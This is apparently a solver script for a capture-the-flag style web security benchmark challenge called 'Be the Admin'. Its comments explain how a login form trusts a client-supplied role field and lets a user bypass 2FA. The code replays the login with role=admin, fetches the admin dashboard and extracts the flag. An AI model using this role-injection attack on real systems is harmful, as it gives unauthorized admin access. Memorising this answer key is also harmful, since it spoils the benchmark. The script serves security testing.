#!/usr/bin/env bash
# XBEN-089-24 — "Be the Admin" (tags: privilege_escalation, business_logic)
#
# The login form posts `username`, `password` *and* `role`. The query checks the
# first two against the database, and then the handler writes the third into the
# session verbatim — the role the client asked for, not the role the row says.
#
# `/admin/dashboard` checks only `session['role'] == 'admin'`. The 2FA step the
# portal advertises sits on `/admin/2fa`, which is where the login *redirects*
# an admin, and which nothing requires you to visit.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben089-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/login' \
    --set 'form.username=emp' --set 'form.password=password1' --set 'form.role=admin' \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create --set 'path=/admin/dashboard' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
